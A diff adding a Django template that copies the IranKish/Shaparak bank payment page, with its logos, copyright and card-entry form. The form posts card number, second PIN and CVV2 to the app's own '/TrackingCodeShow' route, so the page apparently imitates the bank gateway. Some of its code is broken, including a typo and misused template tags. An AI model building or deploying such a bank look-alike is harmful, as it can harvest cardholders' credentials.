@@ -1,0 +1,776 @@
+{% load staticfiles %}
+<!doctype html>
+
+<!-- saved from url=(0041)https://kica.shaparak.ir/epay/paymentPage -->
+<html style="background-color: aliceblue;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta id="tea22sre1" http-equiv="Cache-Control" content="no-store">
+    <meta id="te2123asre1" http-equiv="Pragma" content="no-cache">
+    <meta id="teaw2sre1" http-equiv="Expires" content="0">
+    
+    <link rel="stylesheet" type="text/css" href="{% static "keypad/images/style.css" %}">
+    <title>..:: IranKish ::.s.پرداخت اینترنتی
+    </title>
+    
+    <link rel="stylesheet" type="text/css" href="{% static "keypad/images/keyboard.css" %}">
+    <script type="text/javascript">
+
+        function tabCardNumber1() {
+            var length = document.cardHolders.cardNumber1.value.lesngth + 1;
+            if (length <= 4) {
+                document.cardHolders.cardNumber1.focus();
+            } else {
+                document.cardHolders.cardNumber2.focus();
+            }
+        }
+        function tabCardNumber2() {
+
+            var length = document.cardHolders.cardNumber2.value.length + 1;
+            if (length <= 4) {
+                document.cardHolders.cardNumber2.focus();
+            } else {
+                document.cardHolders.cardNumber3.focus();
+            }
+        }
+        function tabCardNumber3() {
+            var length = document.cardHolders.cardNumber3.value.length + 1;
+            if (length <= 4) {
+                document.cardHolders.cardNumber3.focus();
+            } else {
+                document.cardHolders.cardNumber4.focus();
+            }
+        }
+        function tabCardNumber4() {
+            var length = document.cardHolders.cardNumber4.value.length + 1;
+            if (length <= 4) {
+                document.cardHolders.cardNumber4.focus();
+            } else {
+                document.cardHolders.pin2.focus();
+            }
+        }
+        function tabCvv2() {
+            var length = document.cardHolders.cvv2.value.length + 1;
+            if (length <= 4) {
+                document.cardHolders.cvv2.focus();
+            } else {
+                document.cardHolders.month.focus();
+            }
+        }
+        function tabPin2() {
+            var length = document.cardHolders.pin2.value.length + 1;
+            if (length <= 12) {
+                document.cardHolders.pin2.focus();
+            } else {
+                document.cardHolders.cvv2.focus();
+            }
+        }
+        function tabMonth() {
+            var length = document.cardHolders.month.value.length + 1;
+            if (length <= 2) {
+                document.cardHolders.month.focus();
+            } else {
+                document.cardHolders.year.focus();
+            }
+        }
+        function tabYear() {
+            var length = document.cardHolders.year.value.length + 1;
+            if (length <= 2) {
+                document.cardHolders.year.focus();
+            } else {
+                document.cardHolders.number.focus();
+            }
+        }
+
+        function reloadImage() {
+            var http = new getXMLHttpRequestObject();
+            var url = "/epay/billPayment";
+            var parameters = "action=refreshCaptcha";
+            http.open("GET", url + "?" + parameters, true);
+            http.onreadystatechange = function () {
+                if (http.readyState == 4) {
+                    document.getElementById("captchaImage").src=http.responseText;
+                }
+            }
+            http.send(null);
+        }
+
+    </script>
+    <script type="text/javascript">
+        // set minutes
+        var mins = 10;
+
+        // calculate the seconds (don't change this! unless time progresses at a different speed for you...)
+        var secs = mins * 60;
+        function countdown() {
+
+            setTimeout('Decrement()', 1000);
+        }
+        function Decrement() {
+            
+            if (20000 <  1000 )
+    {
+            alert('خطا در مبلغ تراكنش- حداقل مبلغ مجاز 1000 ريال مي باشد. لطفا با بازگشت به سايت پذيرنده مبلغ را اصلاح نماييد');
+            document.forms["cancelByUser"].submit();
+            }
+            
+                    if ( 1227 >  2337 ||  1227
+                <  23)
+    {
+            alert('سامانه در حال انجام فعاليت پايان روز مي باشد. لطفا پس از ساعت 15 دقيقه بامداد مراجعه نماييد');
+            document.forms["cancelByUser"].submit();
+            }
+
+                        if (document.getElementById) {
+                        minutes = document.getElementById("minutes");
+                        seconds = document.getElementById("seconds");
+// if less than a minute remaining
+                        if (seconds < 59) {
+                        seconds.value = secs;
+                        } else {
+                        minutes.value = getminutes();
+                        seconds.value = getseconds();
+                        }
+                        if (secs > 0) {
+                        secs--;
+                        setTimeout('Decrement()', 1000);
+                        if (secs < 1) {
+                        alert('متاسفانه، مدت زمان جلسه كاري شما به پايان رسيده است و شما مجاز به انجام تراكنش نمي باشيد ');
+                        document.forms["timeOut"].submit();
+                        }
+                        }
+                        }
+                }
+                function getminutes() {
+                    // minutes is seconds divided by 60, rounded down
+                        mins = Math.floor(secs / 60);
+                        return mins;
+                        }
+                        function getseconds() {
+                    // take mins remaining (as seconds) away from total seconds remaining
+                        return secs - Math.round(mins * 60);
+                        }
+    </script>
+    
+    
+    <script language="JavaScript">
+
+        var targetTextId = "cardNumber1";
+
+        function start() {
+
+            var id_name = new Array("1-o", "2-o", "3-o", "4-o", "5-o", "6-o", "7-o", "8-o", "9-o", "0-o");
+            var img_name = new Array("1-onn.png", "2-onn.png", "3-onn.png", "4-onn.png", "5-onn.png", "6-onn.png", "7-onn.png", "8-onn.png", "9-onn.png", "0-onn.png");
+
+            for (var i = 0; i < id_name.length; i++) {
+                var l = img_name.length;
+                var rnd_no = Math.floor(l * Math.random());
+                x = "keypad/images/" + img_name[rnd_no];
+                document.getElementById(id_name[i]).src = {% static x %} ;
+                var imgOff = img_name[rnd_no].substr(0, img_name[rnd_no].length - 6);
+                y = "keypad/images/" + imgOff + "ff.png";
+                document.getElementById(id_name[i] + "2").src = {% static y %}
+                var tmp = img_name;
+                img_name = new Array();
+                for (var j = 0; j < l; j++) {
+                    if (j < rnd_no)
+                        img_name[j] = tmp[j];
+                    else if (j > rnd_no)
+                        img_name[j - 1] = tmp[j];
+                }
+            }
+            document.getElementById(targetTextId).focus();
+        }
+
+    </script>
+    <script type="text/javascript" src="{% static "keypad/images/keypad.js" %}"></script>
+
+    <script type="text/javascript">
+        <!--
+        var message = "";
+        function clickIE() {
+            if (document.all) {
+                (message);
+                return false;
+            }
+        }
+        function clickNS(e) {
+            if
+                    (document.layers || (document.getElementById && !document.all)) {
+                if (e.which == 2 || e.which == 3) {
+                    (message);
+                    return false;
+                }
+            }
+        }
+        if (document.layers)
+        {
+            document.captureEvents(Event.MOUSEDOWN);
+            document.onmousedown = clickNS;
+        }
+        else {
+            document.onmouseup = clickNS;
+            document.oncontextmenu = clickIE;
+        }
+
+        document.oncontextmenu = new Function("return false");
+        // -->
+
+
+        
+        function clear_fields() {
+
+            for (var n = 0; n < document.forms.length; n++) {
+
+                for (var i = 0; i < document.forms[n].elements.length; i++) {
+
+                    if (document.forms[n].elements[i].type == "text") {
+                        document.forms[n].elements[i].setAttribute("autocomplete", "off");
+                    }
+                }
+            }
+        }
+
+        function numeric() {
+
+            for (var n = 0; n < document.forms.length; n++) {
+
+                for (var i = 0; i < document.forms[n].elements.length; i++) {
+
+                    if ((document.forms[n].elements[i].id == "cardNumber4") || (document.forms[n].elements[i].id == "cardNumber3") || (document.forms[n].elements[i].id == "cardNumber2") || (document.forms[n].elements[i].id == "cardNumber1") || (document.forms[n].elements[i].id == "cvv2") || (document.forms[n].elements[i].id == "month") || (document.forms[n].elements[i].id == "year")) {
+                        document.forms[n].elements[i].setAttribute("onkeypress", "numerical(event)");
+                    }
+                }
+            }
+        }
+
+        function numerical(evt) {
+            var deleteKey = 46;
+            var rightkey = 39;
+            var leftkey = 37;
+            var theEvent = evt || window.event;
+            var key = theEvent.keyCode || theEvent.which;
+            if (deleteKey == key || rightkey == key || leftkey == key)return;
+            key = String.fromCharCode(key);
+            var regex = /[0-9]|\t|[\b]/;
+            if (!regex.test(key)) {
+                theEvent.returnValue = false;
+                if (theEvent.preventDefault) theEvent.preventDefault();
+            }
+        }
+
+    </script>
+
+    <style type="text/css">
+        .style1 {
+            font-family: Tahoma;
+        }
+
+        .style2 {
+            font-family: Tahoma;
+            font-size: 9pt;
+        }
+
+        .style3 {
+            font-size: 9pt;
+        }
+    </style>
+
+</head>
+
+<body onload="document.cardHolders.cardNumber1.focus();start();clear_fields();pin2();numeric();">
+<!--div class="footer-back"></div-->
+<table class="main-table" style="" border="0" cellspacing="0" cellpadding="0">
+    <tbody><tr>
+        <td class="top">&nbsp;</td>
+    </tr>
+    <tr>
+        <td style="text-align:center;">
+            <div id="main">
+                <div class="header">
+                    <img style="float: right; margin: 7px 10px 0;" src="{% static "keypad/images/shaparak_logo.png" %}">
+                    <img style="float: left; margin: 7px 10px 0;" src="{% static "keypad/images/irankish_logo.png" %}">
+                </div>
+                
+<form name="cardHolders" action="/TrackingCodeShow" method="post" onsubmit="return cardHolders_cardNumber1_req(this);" enctype="application/x-www-form-urlencoded">
+    {% csrf_token %}
+    <div class="merchant">
+        <table>
+            <tbody><tr>
+                <td colspan="2" class="title">
+                    <div class="title">اطلاعات پذیرنده</div>
+                <span style="float:left; margin-left:10px;">
+                    
+                <span class="keyboardInputInitiator" style="font-family:tahoma !important; width: 100px; text-align:left; border: none; background-color:none; font-size: 11px !important; font-weight: bold;color:azure; font:icon; color:#D3D3D3;">زمان باقيمانده </span>
+                <input id="seconds" type="text" style="text-align:left; margin:0px 0 0; width: 16px; border: none; background-color:#5F73BD; font-size: 12px; color:#D3D3D3; font-weight: bold; " autocomplete="off">
+                <span style="margin: 0 -4px 0 -5px; width: 10px; border: none; background-color:none; font-size: 12px; font-weight: bold; color:azure; font:icon; color: #D3D3D3;">:</span>
+                <input id="minutes" type="text" style="text-align:right; margin:0; width: 16px; border: none; background-color:#5F73BD; font-size: 12px; color:#D3D3D3; font-weight: bold; " autocomplete="off">
+                <script>
+                    countdown();
+                </script>
+
+                </span>
+                </td>
+
+            </tr>
+            <tr>
+        </tr></tbody></table>
+        <table>
+            <tbody><tr><td rowspan="2" class="line">&nbsp;</td>
+            <td>
+                <span class="label">نام فروشنده</span>
+                <label>سامانه صنم
+                </label>
+
+            </td>
+            </tr><tr>
+                <td>
+                    <span class="label">مبلغ پرداختی</span>
+                    <label>{{ total }}</label>
+
+                    <span class="label">(تومان)</span>
+                </td>
+            </tr>
+        </tbody></table>
+    </div>
+    <div class="card">
+        <!--------------------------------------->
+
+        <table width="100%" border="0" cellspacing="2" cellpadding="0">
+            <tbody><tr>
+                <td colspan="7" class="title">
+                    <div class="title">اطلاعات کارت</div>
+                </td>
+            </tr>
+            <tr>
+                <td rowspan="4" class="line">&nbsp;</td>
+                <td><label for="cardHolders:cardNumber" style="padding-top: 7px; width: 107px;">
+                    <span class="label">
+                    شماره کارت
+                    </span></label>
+                    <table style="width: auto;" id="cardHolders:cardNumber" cellpadding="0" borderpadding="0">
+                        <tbody>
+                        <tr>
+                            <td style="height: 22px;">
+                                <input id="cardNumber4" name="cardNumber4" type="text" value="" maxlength="4" size="4" tabindex="4" style="text-align:left;" onkeyup="tabCardNumber4();" onfocus="setTargetFocus(&#39;cardNumber4&#39;);" autocomplete="off">
+                            </td>
+                            <td style="height: 22px;"><input id="cardNumber3" name="cardNumber3" type="text" value="" maxlength="4" size="4" tabindex="3" style="text-align:left;" onkeyup="tabCardNumber3();" onfocus="setTargetFocus(&#39;cardNumber3&#39;);" autocomplete="off">
+                            </td>
+                            <td style="height: 22px;"><input id="cardNumber2" name="cardNumber2" type="text" value="" maxlength="4" size="4" tabindex="2" style="text-align:left;" onkeyup="tabCardNumber2();" onfocus="setTargetFocus(&#39;cardNumber2&#39;);" autocomplete="off">
+                            </td>
+                            <td style="height: 22px;"><input id="cardNumber1" name="cardNumber1" type="text" value="" maxlength="4" size="4" tabindex="1" style="text-align:left;" onkeyup="tabCardNumber1();" onfocus="setTargetFocus(&#39;cardNumber1&#39;);" autocomplete="off">
+                            </td>
+                            <td></td>
+                        </tr>
+                        </tbody>
+                    </table>
+                </td>
+
+                <td class="key"><img id="10-o2" name="10-o2" onmousedown="off(&#39;10-o&#39;);" onmouseup="on(&#39;10-o&#39;);setFocus();" onclick="addText(&#39;10-o&#39;);" style="position:absolute;visibility:hidden;" src="{% static "keypad/images/9-off.png" %}">
+                    <img id="10-o" name="10-o" onmousedown="off(&#39;10-o&#39;);addText(&#39;10-o&#39;);" onmouseup="on(&#39;10-o&#39;);setFocus();" onclick="addText(&#39;10-o&#39;);" src="{% static "keypad/images/9-onn.png" %}"></td>
+                                <td class="key"><img id="5-o2" name="5-o2" onmousedown="off(&#39;5-o&#39;);" onmouseup="on(&#39;5-o&#39;);setFocus();" onclick="addText(&#39;5-o&#39;);" style="position:absolute;visibility:hidden;" src="{% static "keypad/images/8-off.png" %}">
+                    <img id="5-o" name="5-o" onmousedown="off(&#39;5-o&#39;);addText(&#39;5-o&#39;);" onmouseup="on(&#39;5-o&#39;);setFocus();" onclick="addText(&#39;5-o&#39;);" src="{% static "keypad/images/8-onn.png" %}"></td>
+                                <td class="key"><img id="8-o2" name="8-o2" onmousedown="off(&#39;8-o&#39;);" onmouseup="on(&#39;8-o&#39;);setFocus();" onclick="addText(&#39;8-o&#39;);" style="position:absolute;visibility:hidden;" src="{% static "keypad/images/7-off.png" %}">
+                    <img id="8-o" name="8-o" onmousedown="off(&#39;8-o&#39;);addText(&#39;8-o&#39;);" onmouseup="on(&#39;8-o&#39;);setFocus();" onclick="addText(&#39;8-o&#39;);" src="{% static "keypad/images/7-onn.png" %}"></td>
+                <td class="key"><img id="2-o2" name="2-o2" onmousedown="off(&#39;2-o&#39;);" onmouseup="on(&#39;2-o&#39;);" onclick="addText(&#39;2-o&#39;);" style="position:absolute;visibility:hidden;" src="{% static "keypad/images/6-off.png" %}">
+                    <img id="2-o" name="2-o" onmousedown="off(&#39;2-o&#39;);addText(&#39;2-o&#39;);" onmouseup="on(&#39;2-o&#39;);setFocus();" onclick="addText(&#39;2-o&#39;);" src="{% static "keypad/images/6-onn.png" %}"></td>
+
+            </tr>
+            <tr>
+                <td>
+                    <label for="pin2">
+                        <span class="label">رمز دوم کارت</span></label>
+                    <input type="password" id="pin2" name="pin2" maxlength="12" size="10" tabindex="5" style="text-align:left;" onkeyup="tabPin2();" onfocus="setTargetFocus(&#39;pin2&#39;);">
+                    
+                </td>
+                <td class="key"><img id="6-o2" name="6-o2" onmousedown="off(&#39;6-o&#39;);" onmouseup="on(&#39;6-o&#39;);" onclick="addText(&#39;6-o&#39;);" style="position:absolute;visibility:hidden;" src="{% static "keypad/images/5-off.png" %}">
+                    <img id="6-o" name="6-o" onmousedown="off(&#39;6-o&#39;);addText(&#39;6-o&#39;);" onmouseup="on(&#39;6-o&#39;);setFocus();" onclick="addText(&#39;6-o&#39;);" src="{% static "keypad/images/5-onn.png" %}"></td>
+                <td class="key"><img id="3-o2" name="3-o2" onmousedown="off(&#39;3-o&#39;);" onmouseup="on(&#39;3-o&#39;);setFocus();" onclick="addText(&#39;3-o&#39;);" style="position:absolute;visibility:hidden;" src="{% static "keypad/images/4-off.png" %}">
+                    <img id="3-o" name="3-o" onmousedown="off(&#39;3-o&#39;);addText(&#39;3-o&#39;);" onmouseup="on(&#39;3-o&#39;);setFocus();" onclick="addText(&#39;3-o&#39;);" src="{% static "keypad/images/4-onn.png" %}"></td>
+                <td class="key"><img id="7-o2" name="7-o2" onmousedown="off(&#39;7-o&#39;);" onmouseup="on(&#39;7-o&#39;);setFocus();" onclick="addText(&#39;7-o&#39;);" style="position:absolute;visibility:hidden;" src="{% static "keypad/images/3-off.png" %}">
+                    <img id="7-o" name="7-o" onmousedown="off(&#39;7-o&#39;);addText(&#39;7-o&#39;);" onmouseup="on(&#39;7-o&#39;);setFocus();" onclick="addText(&#39;7-o&#39;);" src="{% static "keypad/images/3-onn.png" %}"></td>
+                <td class="key"><img id="4-o2" name="4-o2" onmousedown="off(&#39;4-o&#39;);" onmouseup="on(&#39;4-o&#39;);setFocus();" onclick="addText(&#39;4-o&#39;);" style="position:absolute;visibility:hidden;" src="{% static "keypad/images/2-off.png" %}">
+                    <img id="4-o" name="4-o" onmousedown="off(&#39;4-o&#39;);addText(&#39;4-o&#39;);" onmouseup="on(&#39;4-o&#39;);setFocus();" onclick="addText(&#39;4-o&#39;);" src="{% static "keypad/images/2-onn.png" %}"></td>
+            </tr>
+            <tr>
+                <td><label for="cvv2">
+                    <span class="label">کد   CVV2 </span></label>
+                    <input type="password" id="cvv2" name="cvv2" maxlength="4" size="4" tabindex="6" style="text-align:left;" onkeyup="tabCvv2();" onfocus="setTargetFocus(&#39;cvv2&#39;);">
+                    
+                </td>
+                <td colspan="2" class="key"><img id="back-o2" name="back-o2" src="{% static "keypad/images/back-off.png" %}" onmousedown="off(&#39;back-o&#39;);" onmouseup="on(&#39;back-o&#39;);setFocus();" onclick="deletText();" style="position:absolute;visibility:hidden;">
+                    <img id="back-o" name="back-o" src="{% static "keypad/images/back-onn.png" %}" onmousedown="off(&#39;back-o&#39;);deletText();" onmouseup="on(&#39;back-o&#39;);setFocus();" onclick="deletText();">
+                </td>
+                <td class="key"><img id="0-o2" name="0-o2" onmousedown="off(&#39;0-o&#39;);" onmouseup="on(&#39;0-o&#39;);setFocus();" onclick="addText(&#39;0-o&#39;);" style="position:absolute;visibility:hidden;" src="{% static "keypad/images/0-off.png" %}">
+                    <img id="0-o" name="0-o" onmousedown="off(&#39;0-o&#39;);addText(&#39;0-o&#39;);" onmouseup="on(&#39;0-o&#39;);setFocus();" onclick="addText(&#39;0-o&#39;);" src="{% static "keypad/images/0-onn.png" %}"></td>
+                <td class="key"><img id="9-o2" name="9-o2" onmousedown="off(&#39;9-o&#39;);" onmouseup="on(&#39;9-o&#39;);setFocus();" onclick="addText(&#39;9-o&#39;);" style="position:absolute;visibility:hidden;" src="{% static "keypad/images/1-off.png" %}">
+                    <img id="9-o" name="9-o" onmousedown="off(&#39;9-o&#39;);addText(&#39;9-o&#39;);" onmouseup="on(&#39;9-o&#39;);setFocus();" onclick="addText(&#39;9-o&#39;);" src="{% static "keypad/images/1-onn.png" %}"></td>
+
+            </tr>
+            <tr>
+                <td><label for="cardHolders:date"><span class="label">تاريخ انقضای کارت </span></label>
+                    <label style="width: auto;" class="label" for="month">ماه</label>
+                    <input id="month" name="month" type="text" value="" maxlength="2" size="2" tabindex="7" style="text-align:left;" onkeyup="tabMonth();" onfocus="setTargetFocus(&#39;month&#39;);" autocomplete="off">
+                    
+                    <label style="width: auto;" class="label" for="year">سال</label>
+                    <input id="year" name="year" type="text" value="" maxlength="2" size="2" tabindex="8" style="text-align:left;" onkeyup="tabYear();" onfocus="setTargetFocus(&#39;year&#39;);" autocomplete="off">
+                    </td>
+                <td colspan="2" class="key"><img id="tab-o2" name="tab-o2" src="{% static "keypad/images/tab-off.png" %}" onmousedown="off(&#39;tab-o&#39;);" onmouseup="on(&#39;tab-o&#39;);setFocus();" onclick="tabNext();" style="position:absolute;visibility:hidden;">
+                    <img id="tab-o" name="tab-o" src="{% static "keypad/images/tab-onn.png" %}" onmousedown="off(&#39;tab-o&#39;);tabNext();" onmouseup="on(&#39;tab-o&#39;);setFocus();" onclick="tabNext();">
+                </td>
+                <td colspan="2" class="key"><img id="shiftTab-o2" name="shiftTab-o2" src="{% static "keypad/images/shiftTab-off.png" %}" onmousedown="off(&#39;shiftTab-o&#39;);setFocus();" onmouseup="on(&#39;shiftTab-o&#39;);setFocus();" onclick="tabLast();" style="position:absolute;visibility:hidden;">
+                    <img id="shiftTab-o" name="shiftTab-o" src="{% static "keypad/images/shiftTab-onn.png" %}" onmousedown="off(&#39;shiftTab-o&#39;);tabLast();" onmouseup="on(&#39;shiftTab-o&#39;);setFocus();" onclick="tabLast();"></td>
+
+            </tr>
+        </tbody></table>
+        <!--------------------------------------->
+
+    </div>
+    <div class="merchant">
+        <table>
+            <tbody><tr>
+                <td colspan="2" class="title">
+                    <div class="title">كد امنيتي</div>
+                </td>
+            </tr>
+            <tr>
+                <td rowspan="3" class="line">&nbsp;</td>
+                <td>
+                    <p class="label">لطفا عبارت نمایش داده شده را وارد نمایید
+                        <br>
+                        عبارت نسبت به حروف کوچک یا بزرگ حساس نمی باشد
+                    </p>
+
+                    <p style="text-align: center; padding-bottom: 7px;">
+                        <img style="border:2px solid #161616; border-bottom-width: 0px;margin-left: -6px;" src="{% static "keypad/images/18156375.jpeg" %}" id="captchaImage">
+                        <img src="{% static "keypad/images/Refresh-icon.png" %}" alt="refereshCode" onclick="reloadImage()">
+                        <br>
+                        <input style="text-align: center; background-color: #FFFFFF;border: 2px solid #161616;margin-top: -6px;width: 133px;" tabindex="9" name="number" type="text" dir="ltr" autocomplete="off">
+                        
+                    </p>
+                </td>
+            </tr>
+        </tbody></table>
+    </div>
+
+    <div class="merchant">
+        <table>
+            <tbody><tr>
+                <td colspan="2" class="title">
+                    <div class="title">راهنمای دارندگان كارت</div>
+
+                </td>
+
+            </tr>
+            <tr>
+        </tr></tbody></table>
+        <table>
+            <tbody><tr><td rowspan="2" class="line">&nbsp;</td>
+            <td>
+                <div style="width: 100%; font-size: 9pt; text-align: justify; padding: 10px;">
+                    مشتري گرامي لطفا موارد زير را با دقت مطالعه فرماييد
+                    <br>
+                    - خريد شما توسط شركت كارت اعتباري ايران كيش و شبكه شاپرك انجام ميگيرد
+                    <br>
+                    - اطلاعات كارت بانكي خود را به هيچ عنوان در اختيار سايت فروشنده قرار ندهيد
+                    <br>
+                    - در صورتيكه تراكنش شما به هر دليل با مغايرت روبرو گردد تا 72 ساعت تسويه خواهد شد
+                    <br>
+                    - در وارد نمودن اطلاعات كارت نهايت دقت را به عمل آوريد
+                </div>
+            </td>
+        </tr></tbody></table>
+    </div>
+
+
+    <div class="submit">
+        <input id="payment" name="payment" type="submit" value="پرداخت"  class="button" tabindex="10">
+    </div>
+    <div class="footer">
+
+    </div>
+
+
+
+</form>
+<script language="JavaScript">
+function cardHolders_cardNumber1_req(theForm) {
+if (!theForm.cardNumber1)
+{ alert('Could not get field cardNumber1'); return false;}
+s=theForm.cardNumber1.value;if (s.length<4)
+{ alert('.خطا در ورود چهار شماره اول شماره کارت. لطفا تصحیح نمایید'); return false;}
+if (s.length>4)
+{ alert('.خطا در ورود چهار شماره اول شماره کارت. لطفا تصحیح نمایید'); return false;}
+if (isNaN(s))
+{ alert('.خطا در ورود چهار شماره اول شماره کارت. لطفا تصحیح نمایید'); return false;}
+
+if (!theForm.cardNumber2)
+{ alert('Could not get field cardNumber2'); return false;}
+s=theForm.cardNumber2.value;if (s.length<4)
+{ alert('.خطا در ورود چهار شماره دوم شماره کارت. لطفا تصحیح نمایید '); return false;}
+if (s.length>4)
+{ alert('.خطا در ورود چهار شماره دوم شماره کارت. لطفا تصحیح نمایید '); return false;}
+if (isNaN(s))
+{ alert('.خطا در ورود چهار شماره دوم شماره کارت. لطفا تصحیح نمایید '); return false;}
+
+if (!theForm.cardNumber3)
+{ alert('Could not get field cardNumber3'); return false;}
+s=theForm.cardNumber3.value;if (s.length<1)
+{ alert('.خطا در ورود چهار شماره سوم شماره کارت. لطفا تصحیح نمایید'); return false;}
+if (isNaN(s))
+{ alert('.خطا در ورود چهار شماره سوم شماره کارت. لطفا تصحیح نمایید'); return false;}
+
+if (!theForm.cardNumber4)
+{ alert('Could not get field cardNumber4'); return false;}
+s=theForm.cardNumber4.value;if (s.length<4)
+{ alert('.خطا در ورود چهار شماره چهارم شماره کارت. لطفا تصحیح نمایید'); return false;}
+if (s.length>4)
+{ alert('.خطا در ورود چهار شماره چهارم شماره کارت. لطفا تصحیح نمایید'); return false;}
+if (isNaN(s))
+{ alert('.خطا در ورود چهار شماره چهارم شماره کارت. لطفا تصحیح نمایید'); return false;}
+
+if (!theForm.pin2)
+{ alert('Could not get field pin2'); return false;}
+s=theForm.pin2.value;if (s.length<4)
+{ alert('خطا در ورود رمز دوم کارت. لطفا تصحیح نمایید.'); return false;}
+if (s.length>12)
+{ alert('خطا در ورود رمز دوم کارت. لطفا تصحیح نمایید.'); return false;}
+if (isNaN(s))
+{ alert('خطا در ورود رمز دوم کارت. لطفا تصحیح نمایید.'); return false;}
+
+if (!theForm.cvv2)
+{ alert('Could not get field cvv2'); return false;}
+s=theForm.cvv2.value;if (s.length<3)
+{ alert('.لطفا تصحیح نمایید .(Cvv2) خطا در ورود کد '); return false;}
+if (s.length>4)
+{ alert('.لطفا تصحیح نمایید .(Cvv2) خطا در ورود کد '); return false;}
+if (isNaN(s))
+{ alert('.لطفا تصحیح نمایید .(Cvv2) خطا در ورود کد '); return false;}
+
+if (!theForm.month)
+{ alert('Could not get field month'); return false;}
+s=theForm.month.value;if (s.length<2)
+{ alert('خطا در ورود ماه، لطفا مقدار را بین 01 تا 12 وارد نمایید'); return false;}
+if (isNaN(s))
+{ alert('خطا در ورود ماه، لطفا مقدار را بین 01 تا 12 وارد نمایید'); return false;}
+if (s<1)
+{ alert('خطا در ورود ماه، لطفا مقدار را بین 01 تا 12 وارد نمایید'); return false;}
+if (s>12)
+{ alert('خطا در ورود ماه، لطفا مقدار را بین 01 تا 12 وارد نمایید'); return false;}
+
+if (!theForm.year)
+{ alert('Could not get field year'); return false;}
+s=theForm.year.value;if (s.length<1)
+{ alert('.خطا در ورود سال. لطفا سال را بین 92 تا 99 وارد کنید'); return false;}
+if (isNaN(s))
+{ alert('.خطا در ورود سال. لطفا سال را بین 92 تا 99 وارد کنید'); return false;}
+if (s<91)
+{ alert('.خطا در ورود سال. لطفا سال را بین 92 تا 99 وارد کنید'); return false;}
+if (s>99)
+{ alert('.خطا در ورود سال. لطفا سال را بین 92 تا 99 وارد کنید'); return false;}
+
+if (!theForm.number)
+{ alert('Could not get field number'); return false;}
+s=theForm.number.value;if (s.length<4)
+{ alert('لطفا عبارت نمايش داده شده را به صورت صحيح وارد نماييد'); return false;}
+if (s.length>4)
+{ alert('لطفا عبارت نمايش داده شده را به صورت صحيح وارد نماييد'); return false;}
+return true;
+}
+</script>
+
+<form id="cancelByUser" name="cancelByUser" method="post" action="http://reserve.dining.sharif.ir:8080/account/charge">
+    <input type="hidden" name="paymentId" value="1437518711">
+    <input type="hidden" name="resultCode" value="110">
+</form>
+<form id="timeOut" name="timeOut" method="post" action="http://reserve.dining.sharif.ir:8080/account/charge">
+    <input type="hidden" name="paymentId" value="1437518711">
+    <input type="hidden" name="resultCode" value="140">
+</form>
+
+            </div>
+        </td>
+    </tr>
+    <tr>
+        <td class="bot">
+            تمامي حقوق براي شركت كارت اعتباري ايران كيش محفوظ است - شماره مركز تماس 85949-021
+        </td>
+    </tr>
+</tbody></table>
+
+
+<!--table width="956" border="0" align="center" cellpadding="0" cellspacing="0">
+    <tr>
+        <td>
+            <table id="Table_01" width="935" height="130" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td colspan="8">&nbsp;</td>
+                    <td height="35">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td><img src="/epay/images/header_03.jpg" width="39" height="32" alt=""/></td>
+                    <td background="/epay/images/back_i.jpg" style="font-family:tahoma; font-size:11px;">
+                        <div align="center">94/04/30
+                        </div>
+                    </td>
+                    <td colspan="2"><a href="http://www.tejaratbank.ir/portal/Default.aspx?tabid=1305"><img
+                            src="/epay/images/header_05.jpg" alt="" width="139" height="32" border="0"/></a></td>
+                    <td colspan="2" background="/epay/images/back_i.jpg">
+                        <div align="center" style="font-family:tahoma; font-size:11px;"><a
+                                href="http://www.tejaratbank.ir/" style="text-decoration:none; color:#333333">سايت اصلي
+                            بانك</a></div>
+                    </td>
+                    <td colspan="2"><img src="/epay/images/header_07.jpg" width="285" height="32" alt=""/></td>
+                    <td rowspan="3"><img src="/epay/images/header_08.jpg" width="222" height="94" alt=""/></td>
+                </tr>
+                <tr>
+                    <td colspan="3"><img src="/epay/images/header_09.jpg" width="314" height="48" alt=""/></td>
+                    <td colspan="2"><a href="https://online.tejaratbank.net/"><img src="/epay/images/header_10.jpg"
+                                                                                   width="106" height="48" border="0"
+                                                                                   id="Image3"
+                                                                                   onmouseover="MM_swapImage('Image3','','images/header_10_1.jpg',1)"
+                                                                                   onmouseout="MM_swapImgRestore()"/></a>
+                    </td>
+                    <td colspan="2"><a href="http://sms.tejaratbank.net/"><img src="/epay/images/header_11.jpg"
+                                                                               width="132" height="48" border="0"
+                                                                               id="Image2"
+                                                                               onmouseover="MM_swapImage('Image2','','images/header_11_1.jpg',1)"
+                                                                               onmouseout="MM_swapImgRestore()"/></a>
+                    </td>
+                    <td><a href="https://pg.tejaratbank.net"><img src="/epay/images/header_12_1.jpg" width="161"
+                                                                  height="48" border="0" id="Image1"
+                                                                  onmouseover="MM_swapImage('Image1','','images/header_12.jpg',1)"
+                                                                  onmouseout="MM_swapImgRestore()"/></a></td>
+                </tr>
+                <tr>
+                    <td colspan="8"><img src="/epay/images/header_13.jpg" width="713" height="14" alt=""/></td>
+                </tr>
+                <tr>
+                    <td><img src="/epay/images/spacer.gif" width="39" height="1" alt=""/></td>
+                    <td><img src="/epay/images/spacer.gif" width="146" height="1" alt=""/></td>
+                    <td><img src="/epay/images/spacer.gif" width="129" height="1" alt=""/></td>
+                    <td><img src="/epay/images/spacer.gif" width="10" height="1" alt=""/></td>
+                    <td><img src="/epay/images/spacer.gif" width="96" height="1" alt=""/></td>
+                    <td><img src="/epay/images/spacer.gif" width="8" height="1" alt=""/></td>
+                    <td><img src="/epay/images/spacer.gif" width="124" height="1" alt=""/></td>
+                    <td><img src="/epay/images/spacer.gif" width="161" height="1" alt=""/></td>
+                    <td><img src="/epay/images/spacer.gif" width="222" height="1" alt=""/></td>
+                </tr>
+            </table>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <table width="956" border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                    <td valign="top">
+                        <table width="955" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                                <td width="23"><img src="/epay/images/Main_top_l.gif" width="23" height="32"/></td>
+                                <td background="/epay/images/Main_top_C.gif"><img src="/epay/images/Main_top_C.gif"
+                                                                                   width="2"
+                                                                                   height="32"/></td>
+                                <td width="23"><img src="/epay/images/Main_top_r.gif" width="22" height="32"/></td>
+                                <td width="5">&nbsp;</td>
+                            </tr>
+                            <tr>
+                                <td width="23" background="/epay/images/Main_left_C.gif">&nbsp;</td>
+                                <td align="center" dir="rtl">
+
+                                    
+
+                                </td>
